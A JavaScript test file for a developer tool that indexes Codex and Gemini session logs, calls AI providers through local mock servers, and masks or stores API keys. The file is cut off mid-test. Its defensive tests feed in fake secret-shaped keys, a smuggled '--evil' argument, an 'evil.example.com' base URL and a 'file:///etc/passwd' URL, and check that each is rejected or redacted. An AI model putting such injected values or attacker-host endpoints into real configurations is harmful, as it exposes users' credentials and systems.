// Harness adapters (Codex, Gemini), AI providers and non-Claude launches. No real CLI, API or terminal is used.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { spawnSync } from 'node:child_process';
import crypto from 'node:crypto';
// Assembled at runtime: no secret-shaped literal in the repo (secret scanners flag those).
const FAKE_ANT_KEY = 'sk-' + 'ant-' + 'api03abcdefghijklmnopqrstuvwxyz0123';

process.env.PILOTAGE_DATA = fs.mkdtempSync(path.join(os.tmpdir(), 'pilotage-harness-'));
// Launch tests check the WSL + Windows Terminal path (refusals before anything starts) on every OS. Outside WSL a
// Claude terminal launch would fall back to a real `claude --bg`, which a test must never start.
process.env.PILOTAGE_WSL = '1';
// A fake Windows profile with a stand-in wt.exe that does nothing: the tests never use the real Windows profile or
// open a real Windows Terminal tab, and without a wt.exe Claude launches would fall back to a real `claude --bg`.
{
  const winHome = fs.mkdtempSync(path.join(os.tmpdir(), 'pilotage-harness-winhome-'));
  const apps = path.join(winHome, 'AppData', 'Local', 'Microsoft', 'WindowsApps');
  fs.mkdirSync(apps, { recursive: true });
  fs.writeFileSync(path.join(apps, 'wt.exe'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  process.env.PILOTAGE_WIN_HOME = winHome;
}
process.env.CODEX_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'pilotage-codex-home-')); // never the real ~/.codex
const { ensureDirs, paths, aiWorkDir } = await import('../server/config.js');
ensureDirs();
const { parseCodexFile, codexAdapter, codexToolSummary } = await import('../server/sources/harness/codex.js');
const { parseGeminiChat, geminiAdapter } = await import('../server/sources/harness/gemini.js');
const { SessionIndex } = await import('../server/sources/sessions.js');
const P = await import('../server/ai/providers.js');
const L = await import('../server/launch.js');
const { getStore } = await import('../server/store.js');
const { getSecrets } = await import('../server/auth.js');
const providerRoutes = (await import('../server/routes/providers.js')).default;
const { cleanBaseUrl } = await import('../server/routes/providers.js');

const tmp = (p) => fs.mkdtempSync(path.join(os.tmpdir(), p));
const line = (o) => JSON.stringify(o) + '\n';
const UUID = '019aa7b0-dec5-72c1-b8c7-d3a780256935';

/** Synthetic rollout in the real Codex 0.58 shape. */
function codexFixture({ source = 'cli', partial = true } = {}) {
  const T = (s) => `2026-11-01T10:${s}.000Z`;
  let s = '';
  s += line({ timestamp: T('00:00'), type: 'session_meta', payload: { id: UUID, timestamp: T('00:00'), cwd: '/home/alex/demo/', originator: 'codex_cli_rs', cli_version: '0.58.0', instructions: null, source, model_provider: 'openai', git: { branch: 'main', repository_url: 'https://github.com/a/b.git' } } });
  s += line({ timestamp: T('00:01'), type: 'response_item', payload: { type: 'message', role: 'user', content: [{ type: 'input_text', text: '<environment_context>\n  <cwd>/home/alex/demo</cwd>\n</environment_context>' }] } });
  s += line({ timestamp: T('00:02'), type: 'response_item', payload: { type: 'message', role: 'user', content: [{ type: 'input_text', text: 'Add the CSV export' }] } });
  s += line({ timestamp: T('00:02'), type: 'event_msg', payload: { type: 'user_message', message: 'Add the CSV export', images: [], kind: 'plain' } });
  s += line({ timestamp: T('00:03'), type: 'turn_context', payload: { cwd: '/home/alex/demo', approval_policy: 'on-request', model: 'gpt-5.1-codex', effort: 'medium', summary: 'auto' } });
  s += line({ timestamp: T('00:04'), type: 'response_item', payload: { type: 'reasoning', summary: [{ type: 'summary_text', text: 'thinking' }], content: null, encrypted_content: 'gAAAA' } });
  s += line({ timestamp: T('00:05'), type: 'response_item', payload: { type: 'function_call', name: 'shell', arguments: JSON.stringify({ command: ['bash', '-lc', 'ls src'], workdir: '/home/alex/demo' }), call_id: 'call_1' } });
  s += line({ timestamp: T('00:06'), type: 'response_item', payload: { type: 'function_call_output', call_id: 'call_1', output: JSON.stringify({ output: 'a.js\n', metadata: { exit_code: 0, duration_seconds: 0 } }) } });
  s += line({ timestamp: T('00:07'), type: 'response_item', payload: { type: 'custom_tool_call', status: 'completed', call_id: 'call_2', name: 'apply_patch', input: '*** Begin Patch\n*** Update File: src/a.js\n@@\n-old\n+new\n*** Add File: src/csv.js\n+export {}\n*** End Patch' } });
  s += line({ timestamp: T('00:08'), type: 'response_item', payload: { type: 'custom_tool_call_output', call_id: 'call_2', output: 'Success. Updated the following files:\nM src/a.js' } });
  s += line({ timestamp: T('00:09'), type: 'event_msg', payload: { type: 'agent_message', message: 'Done: CSV export added, see https://github.com/a/b/pull/7' } });
  s += line({ timestamp: T('00:09'), type: 'response_item', payload: { type: 'message', role: 'assistant', content: [{ type: 'output_text', text: 'Done: CSV export added, see https://github.com/a/b/pull/7' }] } });
  s += line({ timestamp: T('00:10'), type: 'event_msg', payload: { type: 'token_count', info: { total_token_usage: { input_tokens: 900, output_tokens: 123 } }, rate_limits: null } });
  s += line({ timestamp: T('30:00'), type: 'compacted', payload: { message: 'Summary: CSV export done, deploy pending.' } });
  s += line({ timestamp: T('31:00'), type: 'event_msg', payload: { type: 'user_message', message: `Deploy it, token ${FAKE_ANT_KEY}`, images: [], kind: 'plain' } });
  s += line({ timestamp: T('32:00'), type: 'response_item', payload: { type: 'message', role: 'assistant', content: [{ type: 'output_text', text: 'Deployed.' }] } });
  if (partial) s += '{"timestamp":"2026-11-01T10:33:00.000Z","type":"event_msg","payload":{"type":"user_mess';
  const dir = tmp('pl-codex-');
  const file = path.join(dir, `rollout-2026-11-01T10-00-00-${UUID}.jsonl`);
  fs.writeFileSync(file, s);
  return file;
}

test('codex rollout → session meta + turns with real byte offsets', async () => {
  const file = codexFixture();
  const { meta, turns } = await parseCodexFile(file, `codex-${UUID}`);
  assert.equal(meta.id, `codex-${UUID}`);
  assert.equal(meta.harness, 'codex');
  assert.equal(meta.source, 'codex');
  assert.equal(meta.cwd, '/home/alex/demo');
  assert.equal(meta.gitBranch, 'main');
  assert.equal(meta.version, '0.58.0');
  assert.equal(meta.entrypoint, 'cli');
  assert.deepEqual(meta.models, { 'gpt-5.1-codex': 1 });
  assert.equal(meta.counts.h, 2, 'env context + duplicate response_item user messages are not prompts');
  assert.equal(meta.counts.x, 1);
  assert.equal(meta.compactions, 1);
  assert.equal(meta.counts.toolUse, 2);
  assert.equal(meta.counts.toolResult, 2);
  assert.equal(meta.counts.assistantText, 2);
  assert.equal(meta.outTokens, 123);
  assert.deepEqual(meta.tools, { shell: 1, apply_patch: 1 });
  assert.deepEqual(Object.keys(meta.files).sort(), ['/home/alex/demo/src/a.js', '/home/alex/demo/src/csv.js']);
  assert.deepEqual(meta.prs, ['https://github.com/a/b/pull/7']);
  assert.equal(meta.firstPrompt, 'Add the CSV export');
  assert.ok(!meta.lastPrompt.includes('abcdefghijklmnopqrstuvwxyz0123'), 'secrets are redacted');
  assert.equal(meta.startedAt, Date.parse('2026-11-01T10:00:00.000Z'));
  assert.equal(meta.lastAt, Date.parse('2026-11-01T10:32:00.000Z'));
  assert.equal(meta.turnCount, 3);
  assert.deepEqual(turns.map((t) => t.o), ['h', 'x', 'h']);
  assert.equal(turns[0].p, 'Add the CSV export');
  assert.equal(turns[0].a, 'Done: CSV export added, see https://github.com/a/b/pull/7');
  assert.equal(turns[0].n, 2);
  assert.equal(turns[2].a, 'Deployed.');
  const buf = fs.readFileSync(file);
  assert.ok(meta.offset < buf.length, 'partial last line is not consumed');
  for (const t of turns) {
    const l = buf.toString('utf8', t.off, buf.indexOf(10, t.off));
    assert.ok(/"type":"(user_message|compacted)"/.test(l), `offset ${t.off} points at the turn's line`);
  }
});

test('codex turn detail reads the rollout slice (prompt, tools with results, one reply)', async () => {
  const file = codexFixture();
  const { meta, turns } = await parseCodexFile(file, `codex-${UUID}`);
  const { items } = await codexAdapter.turnDetail(meta, turns, 0);
  assert.deepEqual(items.map((i) => i.kind), ['prompt', 'tool', 'tool', 'text'], 'agent_message duplicate of the reply is dropped');
  assert.equal(items[1].name, 'shell');
  assert.equal(items[1].summary, 'ls src');
  assert.equal(items[1].result, 'a.js\n');
  assert.equal(items[1].error, false);
  assert.equal(items[2].summary, 'src/a.js, src/csv.js');
  assert.match(items[2].result, /^Success/);
  const last = await codexAdapter.turnDetail(meta, turns, 2);
  assert.deepEqual(last.items.map((i) => i.kind), ['prompt', 'text']);
  assert.equal(codexToolSummary('update_plan', JSON.stringify({ explanation: 'Plan it' })), 'Plan it');
});

test('codex adapter scan: incremental, skips empty rollouts and Pilotage\'s own AI calls', async () => {
  const day = path.join(process.env.CODEX_HOME, 'sessions', '2026', '11', '01');
  fs.mkdirSync(day, { recursive: true });
  fs.copyFileSync(codexFixture({ partial: false }), path.join(day, `rollout-2026-11-01T10-00-00-${UUID}.jsonl`));
  const meta0 = (id, cwd) => line({ timestamp: '2026-11-01T11:00:00.000Z', type: 'session_meta', payload: { id, cwd, cli_version: '0.58.0', source: 'exec' } });
  const emptyId = '11111111-1111-7111-8111-111111111111';
  const ownId = '22222222-2222-7222-8222-222222222222';
  const oldOwnId = '33333333-3333-7333-8333-333333333333';
  const ask = line({ timestamp: '2026-11-01T11:01:00.000Z', type: 'event_msg', payload: { type: 'user_message', message: 'Summarize the work block', images: [] } });
  fs.writeFileSync(path.join(day, `rollout-2026-11-01T11-00-00-${emptyId}.jsonl`), meta0(emptyId, '/home/alex/demo'));
  fs.writeFileSync(path.join(day, `rollout-2026-11-01T11-01-00-${ownId}.jsonl`), meta0(ownId, aiWorkDir()) + ask);
  fs.writeFileSync(path.join(day, `rollout-2026-11-01T11-02-00-${oldOwnId}.jsonl`), meta0(oldOwnId, path.join(process.env.PILOTAGE_DATA, 'ai-sandbox')) + ask); // where earlier versions ran it
  const first = await codexAdapter.scan({ known: new Map() });
  assert.deepEqual(first.metas.map((m) => m.id), [`codex-${UUID}`]);
  assert.equal(first.turns.get(`codex-${UUID}`).length, 3);
  const again = await codexAdapter.scan({ known: new Map(first.metas.map((m) => [m.id, m])) });
  assert.equal(again.metas.length, 1);
  assert.equal(again.turns.size, 0, 'unchanged rollouts are not re-parsed');
  // grown but unreadable for now → the last good meta stays (not reported gone), retried next scan
  if (process.getuid?.() !== 0) {
    const file = path.join(day, `rollout-2026-11-01T10-00-00-${UUID}.jsonl`);
    fs.appendFileSync(file, line({ timestamp: '2026-11-01T10:40:00.000Z', type: 'event_msg', payload: { type: 'user_message', message: 'One more thing', images: [] } }));
    fs.chmodSync(file, 0);
    try {
      const blocked = await codexAdapter.scan({ known: new Map(first.metas.map((m) => [m.id, m])) });
      assert.deepEqual(blocked.metas, first.metas);
      assert.equal(blocked.turns.size, 0);
    } finally {
      fs.chmodSync(file, 0o644);
    }
    const healed = await codexAdapter.scan({ known: new Map(first.metas.map((m) => [m.id, m])) });
    assert.equal(healed.turns.get(`codex-${UUID}`).length, 4);
  }
});

test('codex adapter: a line Codex writes while the rollout is being read is picked up by the next scan', async () => {
  const fsp = (await import('node:fs/promises')).default;
  const uuid = '44444444-4444-7444-8444-444444444444';
  const day = path.join(process.env.CODEX_HOME, 'sessions', '2026', '11', '03');
  fs.mkdirSync(day, { recursive: true });
  const file = path.join(day, `rollout-2026-11-03T09-00-00-${uuid}.jsonl`);
  const head = line({ timestamp: '2026-11-03T09:00:00.000Z', type: 'session_meta', payload: { id: uuid, cwd: '/home/alex/demo', cli_version: '0.58.0', source: 'cli' } }) +
    line({ timestamp: '2026-11-03T09:00:01.000Z', type: 'event_msg', payload: { type: 'user_message', message: 'Fix the build', images: [] } });
  fs.writeFileSync(file, head + line({ timestamp: '2026-11-03T09:00:09.000Z', type: 'response_item', payload: { type: 'message', role: 'assistant', content: [{ type: 'output_text', text: 'Fixed the build.' }] } }));
  // The read ends partway through the reply line, as when Codex is still writing it; the file is complete just after.
  const cut = Buffer.byteLength(head) + 20;
  const { open, readFile } = fsp;
  fsp.readFile = async (f, ...r) => (f === file ? (await readFile(f)).subarray(0, cut) : readFile(f, ...r));
  fsp.open = async (...a) => {
    const fh = await open(...a);
    if (a[0] !== file) return fh;
    const read = fh.read.bind(fh);
    fh.read = (buf, off, len, pos) => (pos >= cut ? Promise.resolve({ bytesRead: 0, buffer: buf }) : read(buf, off, Math.min(len, cut - pos), pos));
    return fh;
  };
  let first;
  try {
    first = await codexAdapter.scan({ known: new Map() });
  } finally {
    Object.assign(fsp, { open, readFile });
  }
  const id = `codex-${uuid}`;
  const m = first.metas.find((x) => x.id === id);
  assert.equal(first.turns.get(id)[0].a, '', 'the cut read has no reply yet');
  const next = await codexAdapter.scan({ known: new Map([[id, m]]) });
  assert.equal(next.turns.get(id)?.[0].a, 'Fixed the build.', 'the next scan reads the rest of the rollout');
  fs.rmSync(file);
});

test('codex exec sessions count as automated runs', async () => {
  const { meta, turns } = await parseCodexFile(codexFixture({ source: 'exec', partial: false }), `codex-${UUID}`);
  assert.equal(meta.counts.h, 0);
  assert.equal(meta.counts.s, 2);
  assert.equal(turns[0].o, 's');
  assert.equal(meta.offset, fs.statSync(meta.file).size);
});

test('gemini chat → turns; UI commands skipped; tools and files counted', () => {
  const doc = {
    sessionId: 'a74d5010-0000-4000-8000-000000000000',
    projectHash: 'x'.repeat(64),
    startTime: '2026-11-02T09:00:00.000Z',
    lastUpdated: '2026-11-02T09:10:00.000Z',
    messages: [
      { id: '1', timestamp: '2026-11-02T09:00:00.000Z', type: 'user', content: '/model' },
      { id: '2', timestamp: '2026-11-02T09:01:00.000Z', type: 'user', content: 'Fix the login page' },
      { id: '3', timestamp: '2026-11-02T09:02:00.000Z', type: 'gemini', content: '', model: 'gemini-3-pro-preview', tokens: { output: 40 }, toolCalls: [{ id: 't1', name: 'write_file', args: { file_path: 'src/login.tsx' }, status: 'success', result: [{ functionResponse: { response: { output: 'ok' } } }] }] },
      { id: '4', timestamp: '2026-11-02T09:03:00.000Z', type: 'gemini', content: 'Fixed the login page.', model: 'gemini-3-pro-preview', tokens: { output: 10 } },
      { id: '5', timestamp: '2026-11-02T09:04:00.000Z', type: 'info', content: 'x' },
      { id: '6', timestamp: '2026-11-02T09:05:00.000Z', type: 'user', content: 'Thanks, now add tests' },
    ],
  };
  const { meta, turns } = parseGeminiChat(doc, { id: 'gemini-2026-11-02T09-00-a74d5010', file: '/x.json', cwd: '/home/alex/app' });
  assert.equal(meta.harness, 'gemini');
  assert.equal(meta.counts.h, 2);
  assert.deepEqual(turns.map((t) => [t.off, t.p]), [[1, 'Fix the login page'], [5, 'Thanks, now add tests']]);
  assert.equal(turns[0].a, 'Fixed the login page.');
  assert.equal(turns[0].n, 1);
  assert.deepEqual(Object.keys(meta.files), ['/home/alex/app/src/login.tsx']);
  assert.deepEqual(meta.models, { 'gemini-3-pro-preview': 2 });
  assert.equal(meta.outTokens, 50);
  assert.equal(meta.lastAt, Date.parse('2026-11-02T09:10:00.000Z'));
});

test('gemini adapter scan: a chat caught mid-rewrite keeps its last good meta (no flicker, retried next scan)', async () => {
  const home = tmp('pl-gemini-home-');
  const cwd = '/home/alex/gem-demo';
  const projectHash = crypto.createHash('sha256').update(cwd).digest('hex');
  const chats = path.join(home, 'tmp', projectHash, 'chats');
  fs.mkdirSync(chats, { recursive: true });
  const file = path.join(chats, 'session-2026-11-02T09-00-a74d5010.json');
  const id = 'gemini-2026-11-02T09-00-a74d5010';
  const T = (m) => `2026-11-02T09:${String(m).padStart(2, '0')}:00.000Z`;
  const chat = (n) => {
    const messages = [];
    for (let i = 0; i < n; i++) {
      messages.push({ id: `u${i}`, timestamp: T(i * 2), type: 'user', content: `Step ${i + 1} of the login fix` });
      messages.push({ id: `g${i}`, timestamp: T(i * 2 + 1), type: 'gemini', content: `Done with step ${i + 1}.`, model: 'gemini-3-pro-preview' });
    }
    return JSON.stringify({ sessionId: 'a74d5010-0000-4000-8000-000000000000', projectHash, startTime: T(0), lastUpdated: T(n * 2), messages });
  };
  const one = chat(1);
  const two = chat(2);
  const torn = two.slice(0, Math.floor(two.length * 0.6));
  assert.notEqual(torn.length, one.length);
  assert.throws(() => JSON.parse(torn));
  const adapter = { ...geminiAdapter, dir: home };
  const knownCwds = () => [cwd];

  fs.writeFileSync(file, one);
  const first = await adapter.scan({ known: new Map(), knownCwds });
  assert.deepEqual(first.metas.map((m) => [m.id, m.cwd]), [[id, cwd]]);
  const known = new Map([[id, first.metas[0]]]);
  fs.writeFileSync(file, torn);
  const mid = await adapter.scan({ known, knownCwds });
  assert.deepEqual(mid.metas, first.metas, 'torn read → previous meta kept');
  assert.equal(mid.turns.size, 0);
  fs.writeFileSync(file, two);
  const healed = await adapter.scan({ known, knownCwds });
  assert.equal(healed.turns.get(id).length, 2, 'retried once the rewrite is complete');

  // Through the index: the torn scan is not a change and the session stays readable.
  const index = new SessionIndex();
  index.adapters = [];
  index.registerAdapter(adapter);
  index.meta.set('claude-g', { id: 'claude-g', harness: 'claude', file: null, cwd, lastAt: 1, turnCount: 0, counts: {} });
  fs.writeFileSync(file, one);
  assert.deepEqual(await index.scanAdapters(), [id]);
  fs.writeFileSync(file, torn);
  assert.deepEqual(await index.scanAdapters(), []);
  assert.ok(index.get(id));
  assert.equal(index.loadTurns(id).length, 1);
  fs.writeFileSync(file, two);
  assert.deepEqual(await index.scanAdapters(), [id]);
  assert.equal(index.loadTurns(id).length, 2);
});

test('SessionIndex adapter registry: adapter metas sit next to Claude ones, detail dispatches, removals propagate', async () => {
  const index = new SessionIndex();
  index.adapters = [];
  let metas = [{ ...(await parseCodexFile(codexFixture(), `codex-${UUID}`)).meta }];
  const turns = (await parseCodexFile(metas[0].file, `codex-${UUID}`)).turns;
  index.registerAdapter({ id: 'codex', label: 'Codex', scan: async () => ({ metas, turns: new Map([[metas[0].id, turns]]) }), turnDetail: codexAdapter.turnDetail });
  index.meta.set('claude-1', { id: 'claude-1', harness: 'claude', file: null, cwd: '/home/alex/demo', lastAt: 1, turnCount: 0, counts: {} });
  const changed = await index.scanAdapters();
  assert.deepEqual(changed, [`codex-${UUID}`]);
  assert.equal(index.get(`codex-${UUID}`).harness, 'codex');
  assert.equal(index.loadTurns(`codex-${UUID}`).length, 3);
  assert.ok(index.list().some((m) => m.id === `codex-${UUID}`));
  const d = await index.turnDetail(`codex-${UUID}`, 0);
  assert.equal(d.items[0].kind, 'prompt');
  // unchanged → no change reported
  index.adapters[0].scan = async () => ({ metas: [index.get(`codex-${UUID}`)], turns: new Map() });
  assert.deepEqual(await index.scanAdapters(), []);
  // disappeared → removed, Claude meta untouched
  metas = [];
  index.adapters[0].scan = async () => ({ metas, turns: new Map() });
  assert.deepEqual(await index.scanAdapters(), [`codex-${UUID}`]);
  assert.equal(index.get(`codex-${UUID}`), null);
  assert.ok(index.get('claude-1'));
  // disabled in settings → the adapter is not run
  getStore().patchSettings({ sources: { harnesses: { codex: false } } });
  index.adapters[0].scan = async () => ({ metas: [{ id: 'codex-y', size: 1, mtimeMs: 1, lastAt: 1, cwd: '/home/alex/demo' }], turns: new Map() });
  assert.deepEqual(await index.scanAdapters(), []);
  assert.equal(index.get('codex-y'), null);
  getStore().patchSettings({ sources: { harnesses: { codex: true } } });
  assert.deepEqual(await index.scanAdapters(), ['codex-y']);
  // an adapter can never shadow a Claude session id
  index.adapters[0].scan = async () => ({ metas: [{ id: 'claude-1', size: 1, mtimeMs: 1, lastAt: 1 }], turns: new Map() });
  await index.scanAdapters();
  assert.equal(index.get('claude-1').harness, 'claude');
});

test('provider JSON parsing is tolerant', () => {
  assert.deepEqual(P.parseJSONLoose('{"a":1}'), { a: 1 });
  assert.deepEqual(P.parseJSONLoose('```json\n{"a":2}\n```'), { a: 2 });
  assert.deepEqual(P.parseJSONLoose('<think>hmm {"no":1</think>Sure! Here it is: {"a":"b}c","n":{"x":[1]}} hope that helps'), { a: 'b}c', n: { x: [1] } });
  assert.equal(P.parseJSONLoose('no json here'), null);
  assert.equal(P.parseJSONLoose('[1,2]').length, 2);
});

test('schema validation: repairs small slips, rejects missing keys', () => {
  const schema = {
    type: 'object',
    additionalProperties: false,
    properties: {
      title: { type: 'string' },
      status: { type: 'string', enum: ['done', 'in_progress'] },
      highlights: { type: 'array', items: { type: 'string' } },
      cvWorthy: { type: 'boolean' },
      items: { type: 'array', items: { type: 'object', additionalProperties: false, properties: { name: { type: 'string' } }, required: ['name'] } },
    },
    required: ['title', 'status', 'highlights', 'cvWorthy', 'items'],
  };
  const ok = P.conformToSchema(schema, { title: 5, status: 'In progress', highlights: 'one', cvWorthy: 'true', items: [{ name: 'a', extra: 1 }], junk: 1 });
  assert.deepEqual(ok.errors, []);
  assert.deepEqual(ok.data, { title: '5', status: 'in_progress', highlights: ['one'], cvWorthy: true, items: [{ name: 'a' }] });
  const filled = P.conformToSchema(schema, { title: 't', status: 'done', items: [] });
  assert.deepEqual(filled.errors, []);
  assert.deepEqual(filled.data.highlights, []);
  assert.equal(filled.data.cvWorthy, false);
  const bad = P.conformToSchema(schema, { title: 't', status: 'maybe' });
  assert.ok(bad.errors.some((e) => e.includes('status')));
  assert.ok(bad.errors.some((e) => e.includes('items missing')));
});

test('chat request: json_schema vs JSON mode (schema in the prompt)', () => {
  const schema = P.TEST_SCHEMA;
  const a = P.buildChatRequest({ model: 'm', instruction: 'Do it.', input: 'in', schema, mode: 'json_schema' });
  assert.equal(a.response_format.type, 'json_schema');
  assert.equal(a.response_format.json_schema.strict, true);
  assert.deepEqual(a.response_format.json_schema.schema, schema);
  const b = P.buildChatRequest({ model: 'm', instruction: 'Do it.', input: 'in', schema, mode: 'json_object' });
  assert.deepEqual(b.response_format, { type: 'json_object' });
  assert.ok(b.messages[0].content.includes('"required":["ok","word"]'), 'schema is spelled out for JSON mode');
  assert.ok(/json/i.test(b.messages[0].content), 'JSON mode prompts must mention JSON (DeepSeek requirement)');
  assert.equal(b.messages[1].content, 'in');
  const ep = P.resolveEndpoint({ preset: 'deepseek' });
  assert.deepEqual([ep.baseUrl, ep.model, ep.schemaMode], ['https://api.deepseek.com', 'deepseek-chat', 'json_object']);
});

test('codex exec args: read-only, no MCP / web search, prompt on stdin; events parsed', () => {
  const args = P.codexExecArgs({ model: 'gpt-5.1-codex-mini', effort: 'low', schemaFile: '/s.json', outFile: '/o.txt', cwd: '/sandbox' });
  assert.equal(args[0], 'exec');
  const after = (f) => args[args.indexOf(f) + 1];
  assert.equal(after('--sandbox'), 'read-only');
  assert.equal(after('-C'), '/sandbox');
  assert.equal(after('-m'), 'gpt-5.1-codex-mini');
  assert.equal(after('--output-schema'), '/s.json');
  assert.equal(after('-o'), '/o.txt');
  assert.ok(args.includes('mcp_servers={}'));
  assert.ok(args.includes('web_search_request'));
  assert.ok(args.includes('model_reasoning_effort="low"'));
  assert.equal(args[args.length - 1], '-');
  assert.ok(!P.codexExecArgs({ model: '--evil', cwd: '/s' }).includes('--evil'), 'unsafe model names are dropped');
  const ev = P.parseCodexEvents(['{"type":"thread.started"}', 'noise', '{"type":"item.completed","item":{"type":"agent_message","text":"{\\"ok\\":true}"}}', '{"type":"turn.completed","usage":{"output_tokens":5}}'].join('\n'));
  assert.equal(ev.text, '{"ok":true}');
  assert.deepEqual(ev.usage, { output_tokens: 5 });
  assert.equal(P.parseCodexEvents('{"type":"turn.failed","error":{"message":"usage limit"}}').error, 'usage limit');
});

test('openai-compatible provider against a local mock: key header, schema fallback, validation, daily cap', async () => {
  const seen = [];
  let rejectSchema = true;
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const j = JSON.parse(body);
      seen.push({ url: req.url, auth: req.headers.authorization, format: j.response_format?.type });
      if (j.response_format?.type === 'json_schema' && rejectSchema) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: { message: 'response_format json_schema is not supported by this model' } }));
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ model: 'mock-1', choices: [{ finish_reason: 'stop', message: { role: 'assistant', content: '```json\n{"ok": true, "word": "pong"}\n```' } }], usage: { total_tokens: 3 } }));
    });
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  try {
    const store = getStore();
    store.patchSettings({ ai: { provider: 'openai-compatible', dailyCallCap: 0, providers: { 'openai-compatible': { preset: 'custom', baseUrl: `http://127.0.0.1:${port}/v1`, model: 'mock-1', schemaMode: 'json_schema' } } } });
    P.setProviderKey('custom', 'sk-test-0123456789abcd');
    const r = await P.testProvider('openai-compatible');
    assert.equal(r.ok, true, r.error);
    assert.equal(r.provider, 'openai-compatible');
    assert.equal(r.model, 'mock-1');
    assert.deepEqual(r.reply, { ok: true, word: 'pong' });
    assert.deepEqual(seen.map((s) => s.format), ['json_schema', 'json_object'], 'falls back to JSON mode when structured outputs are refused');
    assert.equal(seen[0].url, '/v1/chat/completions');
    assert.equal(seen[0].auth, 'Bearer sk-test-0123456789abcd');
    // Schema mismatch is an error, not silently accepted
    const bad = await P.callAI({ instruction: 'x', input: 'y', schema: { type: 'object', properties: { other: { type: 'string', enum: ['a'] } }, required: ['other'] } });
    assert.equal(bad.ok, false);
    assert.match(bad.error, /schema/);
    // Daily cap
    store.patchSettings({ ai: { dailyCallCap: P.callsToday()['openai-compatible'] } });
    assert.equal(P.capStatus('openai-compatible').ok, false);
    const capped = await P.callAI({ instruction: 'x', input: 'y', schema: P.TEST_SCHEMA });
    assert.equal(capped.capped, true);
    assert.equal(P.capStatus('claude-cli').ok, true, 'cap never applies to claude-cli');
    assert.equal(P.usesClaudeUsage('openai-compatible'), false);
    assert.equal(P.usesClaudeUsage('claude-cli'), true);
  } finally {
    server.close();
    getStore().patchSettings({ ai: { provider: 'claude-cli', dailyCallCap: 300 } });
  }
});

test('callAI masks secrets in what it sends, whatever the job put in (CLAUDE.md, memory, READMEs, notes)', async () => {
  const bodies = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      bodies.push(body);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ model: 'mock-1', choices: [{ finish_reason: 'stop', message: { role: 'assistant', content: '{"ok": true, "word": "pong"}' } }] }));
    });
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  try {
    getStore().patchSettings({ ai: { provider: 'openai-compatible', dailyCallCap: 0, providers: { 'openai-compatible': { preset: 'custom', baseUrl: `http://127.0.0.1:${port}/v1`, model: 'mock-1', schemaMode: 'json_object' } } } });
    P.setProviderKey('custom', 'sk-test-0123456789abcd');
    // Assembled at runtime so no secret-shaped literal sits in the repo.
    const stripe = 'sk_' + 'live_' + 'abcdefghijklmnop1234';
    const dbPass = 'Sup3rS3cretPw';
    const input = `# CLAUDE.md\nSTRIPE_SECRET_KEY=${stripe}\nDatabase: postgres://admin:${dbPass}@db.example.com/app\n`;
    const r = await P.callAI({ instruction: 'Summarize.', input, schema: P.TEST_SCHEMA });
    assert.equal(r.ok, true, r.error);
    assert.equal(bodies.length, 1);
    assert.ok(!bodies[0].includes(stripe), 'the Stripe key was sent');
    assert.ok(!bodies[0].includes(dbPass), 'the database password was sent');
    assert.match(bodies[0], /\[hidden\]/);
  } finally {
    server.close();
    getStore().patchSettings({ ai: { provider: 'claude-cli', dailyCallCap: 300 } });
  }
});

test('provider routes: keys are stored 0600 and never returned', async () => {
  const handlers = {};
  const out = {};
  const ctx = {
    store: getStore(),
    json: (res, body, status = 200) => Object.assign(out, { body, status }),
    fail: (res, status, error) => Object.assign(out, { body: { error }, status }),
    broadcast: () => {},
    index: { list: () => [], adapters: [], allSources: () => [], scan: async () => [] },
    registry: { rebuild: async () => {} },
    log: { warn() {} },
  };
  providerRoutes({ route: (m, p, h) => (handlers[`${m} ${p}`] = h), ctx });
  const key = 'sk-secret-ZZZZ-9876543210wxyz';
  await handlers['PATCH /api/providers'](null, null, { body: { provider: 'openai-compatible', apiKey: key, apiKeyPreset: 'deepseek', providers: { 'openai-compatible': { preset: 'deepseek', model: 'deepseek-chat' } }, dailyCallCap: 50 } });
  assert.equal(out.status, 200, JSON.stringify(out.body));
  assert.ok(!JSON.stringify(out.body).includes(key), 'PATCH response has no key');
  const ds = out.body.presets.find((p) => p.id === 'deepseek');
  assert.deepEqual([ds.hasKey, ds.last4], [true, 'wxyz']);
  assert.equal(out.body.provider, 'openai-compatible');
  assert.equal(out.body.dailyCallCap, 50);
  await handlers['GET /api/providers'](null, null, {});
  assert.ok(!JSON.stringify(out.body).includes(key), 'GET response has no key');
  assert.ok(!JSON.stringify(getStore().settings).includes(key), 'key is not in settings/state.json');
  const st = fs.statSync(paths.secrets);
  assert.equal(st.mode & 0o777, 0o600);
  assert.equal(JSON.parse(fs.readFileSync(paths.secrets, 'utf8')).providerKeys.deepseek.key, key);
  assert.equal(getSecrets().data.providerKeys.deepseek.key, key);
  await handlers['PATCH /api/providers'](null, null, { body: { apiKey: 'has spaces in it' } });
  assert.equal(out.status, 400);
  await handlers['PATCH /api/providers'](null, null, { body: { providers: { 'openai-compatible': { baseUrl: 'http://evil.example.com/v1' } } } });
  assert.equal(out.status, 400, 'plain http only for local hosts');
  await handlers['PATCH /api/providers'](null, null, { body: { apiKey: null, apiKeyPreset: 'deepseek', provider: 'claude-cli' } });
  assert.equal(out.body.presets.find((p) => p.id === 'deepseek').hasKey, false);
  assert.equal(cleanBaseUrl('https://api.deepseek.com/'), 'https://api.deepseek.com');
  assert.equal(cleanBaseUrl('http://localhost:11434/v1'), 'http://localhost:11434/v1');
  assert.equal(cleanBaseUrl('https://user:pw@x.com'), null);
  assert.equal(cleanBaseUrl('file:///etc/passwd'), null);
  await handlers['PATCH /api/harnesses'](null, null, { body: { extraClaudeDirs: ['/definitely/not/here'] } });
  assert.equal(out.status, 400);
});

test('permission modes fail closed: unknown, mistyped or "default" ask first; only bypassPermissions skips prompts', () => {
